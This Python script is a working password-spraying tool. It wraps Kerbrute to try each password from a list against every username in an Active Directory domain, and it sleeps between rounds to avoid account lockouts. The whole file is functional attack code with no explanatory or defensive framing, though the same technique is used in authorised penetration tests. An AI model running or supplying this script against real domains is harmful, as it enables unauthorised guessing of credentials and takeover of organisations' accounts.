import subprocess
import argparse
import time
import shutil
import sys

parser = argparse.ArgumentParser(
    description="Password sprayer using Kerbrute.",
    formatter_class=argparse.ArgumentDefaultsHelpFormatter
)

parser.add_argument("--users", required=True, help="Path to username list.")
parser.add_argument("--passwords", required=True, help="Path to password list.")
parser.add_argument("--sleep", type=int, default=120, help="Minutes to sleep in between password sprays.")
parser.add_argument("--domain", required=True, help="Domain name.")
parser.add_argument("--attempts", default=1, type=int, help="Number of attempts before sleeping.")
parser.add_argument("--dc", help="IP address of the Domain Controller (optional).")

args = parser.parse_args()

# Check if kerbrute is in PATH
if shutil.which("kerbrute") is None:
    print("[-] kerbrute not found in PATH. Please install it or add it to your PATH.")
    sys.exit(1)

minutes = args.sleep * 60
attempt_counter = 0

try:
    with open(args.passwords) as passwords:
        for line in passwords:
            password = line.strip()
            if not password:
                continue

            print(f"[>] Trying password: {password}")  # Show which password is being tried

            cmd = ["kerbrute", "passwordspray", "-d", args.domain, args.users, password]
            if args.dc:
                cmd += ["--dc", args.dc]

            try:
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    check=False
                )
                print(result.stdout)
                if result.stderr:
                    print(result.stderr, file=sys.stderr)
            except Exception as e:
                print(f"[!] Error running kerbrute: {e}", file=sys.stderr)

            attempt_counter += 1
            if attempt_counter == args.attempts:
                attempt_counter = 0
                print(f"[+] Reached {args.attempts} attempts. Sleeping for {args.sleep} minute(s)...")
                time.sleep(minutes)

except FileNotFoundError:
    print(f"[!] Password file not found: {args.passwords}")
    sys.exit(1)
except Exception as e:
    print(f"[!] Unexpected error: {e}")
    sys.exit(1)
